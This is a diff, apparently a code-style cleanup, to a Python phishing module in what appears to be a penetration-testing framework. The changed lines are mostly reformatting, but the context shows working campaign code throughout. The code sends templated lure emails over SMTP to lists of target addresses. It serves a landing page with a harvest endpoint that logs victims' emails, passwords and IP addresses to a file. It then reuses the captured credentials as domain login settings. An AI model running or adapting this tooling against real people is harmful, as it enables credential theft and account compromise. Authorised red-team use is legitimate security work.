@@ -12,7 +12,6 @@ import json
 import os
 import shlex
 import smtplib
-import subprocess
 import time
 import uuid
 from email.mime.multipart import MIMEMultipart
@@ -93,10 +92,26 @@ BUILTIN_TEMPLATES = {
 }
 
 ROLE_PREFIXES = [
-    "admin", "info", "it", "hr", "sales", "security", "support",
-    "noc", "soc", "helpdesk", "contact", "office", "marketing",
-    "finance", "legal", "compliance", "operations", "webmaster",
-    "postmaster", "abuse",
+    "admin",
+    "info",
+    "it",
+    "hr",
+    "sales",
+    "security",
+    "support",
+    "noc",
+    "soc",
+    "helpdesk",
+    "contact",
+    "office",
+    "marketing",
+    "finance",
+    "legal",
+    "compliance",
+    "operations",
+    "webmaster",
+    "postmaster",
+    "abuse",
 ]
 
 LANDING_PAGE_HTML = """<!DOCTYPE html>
@@ -217,9 +232,9 @@ class PhishingWizardCommandSet(LazyOwnCommandSet):
             tpl = BUILTIN_TEMPLATES[name]
             print_msg(f"  [{name}] {tpl['subject']}")
 
-        template_name = input(f"\n    [!] Select template (default: microsoft_365): ").strip() or "microsoft_365"
+        template_name = input("\n    [!] Select template (default: microsoft_365): ").strip() or "microsoft_365"
         if template_name not in BUILTIN_TEMPLATES:
-            print_warn(f"Unknown template, using microsoft_365")
+            print_warn("Unknown template, using microsoft_365")
             template_name = "microsoft_365"
 
         template = BUILTIN_TEMPLATES[template_name]
@@ -264,7 +279,9 @@ class PhishingWizardCommandSet(LazyOwnCommandSet):
             preview_dir = os.path.join(campaign_dir, "previews")
             os.makedirs(preview_dir, exist_ok=True)
             for idx, target in enumerate(targets[:20]):
-                first_name = target.split("@")[0].split(".")[0].title() if "." in target else target.split("@")[0].title()
+                first_name = (
+                    target.split("@")[0].split(".")[0].title() if "." in target else target.split("@")[0].title()
+                )
                 html_body = template["body"].format(
                     first_name=first_name,
                     phishing_url=phishing_url,
@@ -281,7 +298,9 @@ class PhishingWizardCommandSet(LazyOwnCommandSet):
             sent = 0
             failed = 0
             for idx, target in enumerate(targets[:50]):
-                first_name = target.split("@")[0].split(".")[0].title() if "." in target else target.split("@")[0].title()
+                first_name = (
+                    target.split("@")[0].split(".")[0].title() if "." in target else target.split("@")[0].title()
+                )
                 html_body = template["body"].format(
                     first_name=first_name,
                     phishing_url=phishing_url,
@@ -291,12 +310,21 @@ class PhishingWizardCommandSet(LazyOwnCommandSet):
                     deadline="Friday, 5:00 PM",
                 )
                 sender_name = template.get("sender_name", "IT Support")
-                if _send_smtp_email(smtp_server, smtp_port, sender_email, sender_password, target, f"{sender_name} <{sender_email}>", template["subject"].format(first_name=first_name, duration="24 hours", sender_number="+1-555-0199"), html_body):
+                if _send_smtp_email(
+                    smtp_server,
+                    smtp_port,
+                    sender_email,
+                    sender_password,
+                    target,
+                    f"{sender_name} <{sender_email}>",
+                    template["subject"].format(first_name=first_name, duration="24 hours", sender_number="+1-555-0199"),
+                    html_body,
+                ):
                     sent += 1
                 else:
                     failed += 1
                 if (idx + 1) % 10 == 0:
-                    print_msg(f"  Sent {idx+1}/{min(len(targets), 50)}")
+                    print_msg(f"  Sent {idx + 1}/{min(len(targets), 50)}")
                 time.sleep(2)
 
             print_msg(f"Sent: {sent}, Failed: {failed}")
@@ -348,7 +376,7 @@ class PhishingWizardCommandSet(LazyOwnCommandSet):
         print_msg(f"Landing page: http://0.0.0.0:{port}/phish/{campaign_id}")
         print_msg(f"Harvest endpoint: http://0.0.0.0:{port}/harvest/{campaign_id}")
 
-        from http.server import HTTPServer, BaseHTTPRequestHandler
+        from http.server import BaseHTTPRequestHandler, HTTPServer
 
         class PhishingHandler(BaseHTTPRequestHandler):
             def log_message(self, format, *args):
@@ -375,7 +403,9 @@ class PhishingWizardCommandSet(LazyOwnCommandSet):
                     body = self.rfile.read(content_length)
                     try:
                         data = json.loads(body)
-                        _log_credentials(campaign_dir, data.get("email", ""), data.get("password", ""), self.client_address[0])
+                        _log_credentials(
+                            campaign_dir, data.get("email", ""), data.get("password", ""), self.client_address[0]
+                        )
                         print_msg(f"  Credentials captured: {data.get('email')}")
                     except json.JSONDecodeError:
                         pass
@@ -456,6 +486,7 @@ class PhishingWizardCommandSet(LazyOwnCommandSet):
             if use == "y":
                 first = creds[0]
                 from utils import lazyown_set_config
+
                 lazyown_set_config("domain_user", first.get("email", ""))
                 lazyown_set_config("domain_pass", first.get("password", ""))
                 print_msg(f"Set domain_user={first.get('email')} domain_pass={first.get('password')}")
@@ -522,10 +553,14 @@ def _log_credentials(campaign_dir: str, email: str, password: str, ip: str) -> N
 
     global_creds_path = "sessions/phishing_credentials.txt"
     with open(global_creds_path, "a") as f:
-        f.write(f"{datetime.datetime.now().isoformat()} | {email} | {password} | {campaign_dir.split('_')[-1] if '_' in campaign_dir else campaign_dir}\n")
+        f.write(
+            f"{datetime.datetime.now().isoformat()} | {email} | {password} | {campaign_dir.split('_')[-1] if '_' in campaign_dir else campaign_dir}\n"
+        )
 
 
-def _send_smtp_email(server: str, port: int, username: str, password: str, to_email: str, from_addr: str, subject: str, html_body: str) -> bool:
+def _send_smtp_email(
+    server: str, port: int, username: str, password: str, to_email: str, from_addr: str, subject: str, html_body: str
+) -> bool:
     """Send an email via SMTP.
 
     Args:
@@ -585,7 +620,9 @@ def _send_smtp_email(server: str, port: int, username: str, password: str, to_em
         parts = line.strip().split()
         if len(parts) < 2:
             print_error("Usage: phisher <domain> <template> [mode]")
-            print_msg("Available templates: microsoft_365_login, sharepoint_share, password_reset, voicemail_notification, hr_policy_update")  # noqa: E501
+            print_msg(
+                "Available templates: microsoft_365_login, sharepoint_share, password_reset, voicemail_notification, hr_policy_update"
+            )  # noqa: E501
             return
 
         target_domain = parts[0]
